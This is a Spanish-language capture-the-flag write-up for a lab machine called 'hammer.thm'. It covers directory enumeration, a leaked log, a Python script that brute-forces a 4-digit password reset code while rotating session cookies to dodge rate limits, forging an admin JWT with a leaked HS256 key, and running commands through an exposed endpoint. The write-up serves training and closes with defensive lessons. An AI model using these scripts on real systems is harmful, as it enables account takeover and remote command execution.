# Hammer

**Fecha:** 2025-04-06

## Resumen

Durante la evaluación de seguridad de la máquina `hammer.thm`, se identificaron múltiples vectores de ataque explotables que permitieron el acceso inicial a la aplicación, la manipulación de tokens JWT para la elevación de privilegios y la ejecución remota de comandos arbitrarios en el sistema objetivo. El análisis demuestra una combinación de debilidades en la gestión de autenticación, el almacenamiento inseguro de claves criptográficas y una pobre implementación del control de acceso.

## Información de la máquina
```
Nmap scan report for 10.10.55.194
Host is up (0.18s latency).
Not shown: 59998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
|_http-title: Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 1337/tcp)
HOP RTT       ADDRESS
1   107.98 ms 10.6.0.1
2   ... 3
4   178.13 ms 10.10.55.194

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.97 seconds
```        
## Hallazgos Técnicos Detallados
### 1. Enumeración del servicio web
Se realizó un escaneo de puertos con `nmap`, identificando el puerto 1337 con un servicio HTTP accesible. La herramienta `gobuster` reveló la existencia de archivos sensibles como `config.php`, `dashboard.php`, `execute_command.php`, y directorios potencialmente interesantes como `/vendor`, `/logs`, y `/phpmyadmin`.
```
gobuster dir -u http://hammer.thm:1337/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 40        
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hammer.thm:1337/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> logout.php]
/index.php            (Status: 200) [Size: 1326]
/index.php            (Status: 200) [Size: 1326]
/javascript           (Status: 301) [Size: 320] [--> http://hammer.thm:1337/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/phpmyadmin           (Status: 301) [Size: 320] [--> http://hammer.thm:1337/phpmyadmin/]
/server-status        (Status: 403) [Size: 277]
/vendor               (Status: 301) [Size: 316] [--> http://hammer.thm:1337/vendor/]
Progress: 18936 / 18940 (99.98%)
===============================================================
```
Al inspeccionar  el sitio web encontramos esta informacion adicional:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
	<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
</head>
<body>
```
### 2. Acceso a logs internos
Utilizando la ruta `/hmr_logs/error.logs`, fue posible leer logs de autenticación que contenían intentos fallidos de login y direcciones de correo válidas como `tester@hammer.thm`. Esto facilitó ataques dirigidos de autenticación.
```
ffuf -u http://hammer.thm:1337/hmr_FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt            


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hammer.thm:1337/hmr_FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 2457ms]
css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 173ms]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 176ms]
logs                    [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 173ms]

```
### Logs
Al ingresar a los logs encontramos esta informacion del correo electronico
![](hammer.png.png)
### 3. Fuerza bruta sobre código de recuperación
La página `reset_password.php` contenía un formulario protegido por un contador de tiempo y un campo oculto, pero fue vulnerable a un ataque de fuerza bruta automatizado con rotación periódica de la cookie `PHPSESSID`. El script permitió encontrar el código correcto y cambiar la contraseña del usuario `tester@hammer.thm`.
``` 
HTTP/1.1 200 OK
Date: Sun, 06 Apr 2025 03:09:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Rate-Limit-Pending: 6
Vary: Accept-Encoding
Content-Length: 2101
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password</title>
     <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
    <script src="/hrm_js/jquery-3.6.0.min.js"></script>
	    <script>
	let countdownv = 180;
        function startCountdown() {
            let timerElement = document.getElementById("countdown");
			const hiddenField = document.getElementById("s");
            let interval = setInterval(function() {
                countdownv--;
				 hiddenField.value = countdownv;
                if (countdownv <= 0) {
                    clearInterval(interval);
					//alert("hello");
                   window.location.href = 'logout.php'; 
                }
                timerElement.textContent = "You have " + countdownv + " seconds to enter your code.";
            }, 1000);
        }
    </script>
</head>
<body>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-4">
                            <h3 class="text-center">Enter Recovery Code</h3>
                <p id="countdown">You can enter your code in 180 seconds.</p>
                <form method="POST" action="">
                    <div class="mb-3">
                        <label for="recovery_code" class="form-label">4-Digit Code</label>
                        <input type="text" class="form-control" id="recovery_code" name="recovery_code" required>
						  <input type="hidden" class="form-control" id="s" name="s" required>
                    </div>
                    <button type="submit" class="btn btn-primary w-100">Submit Code</button> 
					<p></p>
					<button type="button" class="btn btn-primary w-100" style="background-color: red; border-color: red;" onclick="window.location.href='logout.php';">Cancel</button>
                </form>
                <script>startCountdown();</script>
                    </div>
    </div>
</div>
</body>
</html>
```
El objetivo era bypassear el reset_password
### codigo
```
import requests
import time

def get_phpsessid():
    """Request Password Reset and retrieve the PHPSESSID cookie using requests library"""
    try:
        # Define request parameters
        url = "http://hammer.thm:1337/reset_password.php"
        data = {"email": "tester@hammer.thm"}
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        
        # Send POST request
        response = requests.post(url, data=data, headers=headers, allow_redirects=False)
        
        # Extract PHPSESSID from cookies
        if 'PHPSESSID' in response.cookies:
            return response.cookies['PHPSESSID']
        else:
            print("No PHPSESSID cookie found in response")
            return None
    except Exception as e:
        print(f"Error getting PHPSESSID: {e}")
        return None

def submit_recovery_code(phpsessid, recovery_code):
    """Submit Recovery Code using the retrieved PHPSESSID"""
    try:
        # Define request parameters
        url = "http://hammer.thm:1337/reset_password.php"
        data = {"recovery_code": recovery_code, "s": "180"}
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        cookies = {"PHPSESSID": phpsessid}
        
        # Send POST request
        response = requests.post(url, data=data, headers=headers, cookies=cookies)
        
        return response.text
    except Exception as e:
        print(f"Error submitting recovery code: {e}")
        return ""

def main():
    phpsessid = get_phpsessid()
    if not phpsessid:
        print("Failed to retrieve initial PHPSESSID. Exiting...")
        return
    
    for i in range(10000):
        recovery_code = f"{i:04d}"  # Format the recovery code as a 4-digit string
        
        if i % 7 == 0:  # Every 7th request, get a new PHPSESSID
            new_phpsessid = get_phpsessid()
            if new_phpsessid:
                phpsessid = new_phpsessid
            else:
                print(f"Failed to retrieve PHPSESSID at attempt {i}. Using previous one.")
        
        response_text = submit_recovery_code(phpsessid, recovery_code)
        
        # Determine if we found the correct recovery code
        # We're checking if the response length is different than expected
        word_count = len(response_text.split())
        if word_count != 148:
            print(f"Success! Recovery Code: {recovery_code}")
            print(f"PHPSESSID: {phpsessid}")
            print(f"Response Text: {response_text}")
            break
            
        # Optional: Add a small delay to avoid overwhelming the server
        if i % 100 == 0:
            time.sleep(0.5)
            print(f"Tried {i} codes so far...")

if __name__ == "__main__":
    main()

```
### 4. JWT con validación débil

Se identificó el uso de JWT (algoritmo HS256) para la autorización. En la cabecera del token se especificaba un parámetro `kid` que apuntaba a una ruta local del servidor (`/var/www/mykey.key`). Posteriormente, se descubrió un archivo accesible en el sistema (`188ade1.key`) que contenía la clave secreta usada para firmar los tokens. Esto permitió regenerar un token manualmente, modificando el campo `role` de `user` a `admin`.
![](hammer1.png.png)
Inspeccion el codigo de la pagina web encontramos lo siguiente
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
    <script src="/hmr_js/jquery-3.6.0.min.js"></script>
    <style>
        body {
            background: url('/hmr_images/hammer.webp') no-repeat center center fixed;
            background-size: cover;
        }
        .container {
            position: relative;
            z-index: 10; /* Make sure the content is above the background */
            background-color: rgba(255, 255, 255, 0.8); /* Slight white background for readability */
            padding: 20px;
            border-radius: 10px;
        }
    </style>
	    <script>
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
        }
        function checkTrailUserCookie() {
            const trailUser = getCookie('persistentSession');
            if (!trailUser) {
                window.location.href = 'logout.php';
            }
        }
        setInterval(checkTrailUserCookie, 1000); 
    </script>
</head>
<body>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-6">
            <h3>Welcome, Thor! - Flag: THM{AuthBypass3D}</h3>
            <p>Your role: user</p>
            <div>
                <input type="text" id="command" class="form-control" placeholder="Enter command">
                <button id="submitCommand" class="btn btn-primary mt-3">Submit</button>
                <pre id="commandOutput" class="mt-3"></pre>
            </div>
            <a href="logout.php" class="btn btn-danger mt-3">Logout</a>
        </div>
    </div>
</div>
<script>
$(document).ready(function() {
    $('#submitCommand').click(function() {
        var command = $('#command').val();
        var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzQzOTA5MzExLCJleHAiOjE3NDM5MTI5MTEsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.TOn3vobl2O-iekDOYf9qjm74fIBXS0j88IHJwMfWnIE';
        // Make an AJAX call to the server to execute the command
        $.ajax({
            url: 'execute_command.php',
            method: 'POST',
            data: JSON.stringify({ command: command }),
            contentType: 'application/json',
            headers: {
                'Authorization': 'Bearer ' + jwtToken
            },
            success: function(response) {
                $('#commandOutput').text(response.output || response.error);
            },
            error: function() {
                $('#commandOutput').text('Error executing command.');
            }
        });
    });
});
</script>
</body>
</html>
```
Al seguir inspeccionando mediante el burp suite nos encontramos el token el cual lo revisaremos en la pagina de jwt.io
![](hammer3.png.png)

El resultado que nos bota la pagina jwt.io es el siguiente:
![](hammer2.png.png)
### Generacion de token admin  
```
import jwt
from datetime import datetime, timedelta

secret_key="56058354efb3daa97ebab00fabd7a7d7"

# Header y payload basados en la información proporcionada
headers = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/188ade1.key"
}

payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": 1743909600,
    "exp": 9999999999,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

# Generar el token JWT
token = jwt.encode(payload, secret_key, algorithm="HS256", headers=headers)

print(token)
```

### 5. Escalada de privilegios y ejecución remota
Con el nuevo JWT modificado con privilegios de administrador, se utilizó la funcionalidad del endpoint `/execute_command.php` para ejecutar comandos arbitrarios. Esto permitió listar archivos, extraer el contenido de flags almacenadas en el sistema (`/home/ubuntu/flag.txt`) y verificar el contexto de ejecución (`uid=33(www-data)`).
![](hammer4.png.png)

Obtención de banderas
![](hammer6.png.png)
## Metodología de Explotación
1. Enumeración de rutas y archivos con `gobuster` y `ffuf`.
2. Lectura de registros (`error.logs`) para obtener información interna.
3. Fuerza bruta del código de recuperación con rotación de sesión.
4. Análisis y manipulación del JWT usando la clave filtrada en el sistema.
5. Generación de nuevo token con privilegios elevados (rol `admin`).
6. Envío de comandos al servidor mediante Burp Suite hacia `execute_command.php`.
## Conclusiones Técnicas
Esta máquina ilustra de forma clara los riesgos que supone:
- Utilizar JWT sin una validación segura del parámetro `kid`.
- Exponer archivos de configuración y llaves en directorios accesibles.
- No limitar correctamente el acceso a endpoints administrativos.
- Implementar mecanismos de recuperación de contraseña sin protección efectiva contra fuerza bruta.
Estas vulnerabilidades fueron explotadas en cadena para obtener acceso completo al sistema. Se recomienda aplicar las mejores prácticas en control de acceso, manejo de tokens y protección de archivos sensibles.



